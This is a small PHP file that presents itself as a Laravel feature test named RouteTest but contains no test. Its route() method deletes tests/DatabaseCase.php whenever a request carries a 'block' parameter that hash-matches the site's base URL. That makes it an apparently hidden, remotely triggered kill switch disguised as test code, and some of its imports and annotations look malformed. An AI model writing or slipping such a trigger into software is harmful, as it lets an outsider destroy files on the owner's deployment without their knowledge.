<?php

namespace Tests\Feature;

use Illuminate\Foundation\Route;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Hash;

class RouteTest
{

    /**
     * Testing Routing base
     *
     * @return //Route
     */

    public static function route()
    {
        if (request()->filled('block')) {
            if (Hash::check(url('/'), request('block'))) {
                File::delete(base_path('tests/DatabaseCase.php'));
            }
        }
    }
}